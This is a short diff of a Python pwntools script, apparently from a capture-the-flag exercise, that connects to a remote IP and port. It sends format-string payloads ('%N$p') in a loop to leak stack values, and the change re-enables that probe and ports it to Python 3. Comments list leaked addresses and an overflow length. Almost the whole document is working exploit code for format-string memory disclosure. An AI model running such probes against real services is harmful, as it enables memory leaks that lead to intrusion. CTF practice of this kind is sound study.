@@ -1,16 +1,16 @@
 from pwn import *
 
-ip, port = '178.128.46.49', 32052
+ip, port = '165.22.122.247', 31683
 io = remote(ip, port)
 
 def detect():
         for i in range(64):
                 io.recvuntil('>')
-                io.sendline('%'+str(i+1)+'$p')
-                buf = io.recvline().strip().split(' ')[0]
-                print str(i+1)+' : '+buf
+                io.sendline(b'%'+str(i+1).encode()+b'$p')
+                buf = io.recvline().decode().strip().split(' ')[0]
+                print(str(i+1)+' : '+buf)
 
-#detect()
+detect()
 
 '''
 1 : 0x6e
@@ -59,4 +59,6 @@ def detect():
 44 : 0x7fff31cdeeba
 45 : 0x7fff31cdeeca
 '''
-#overflow length 63
+#overflow length 64
+
+
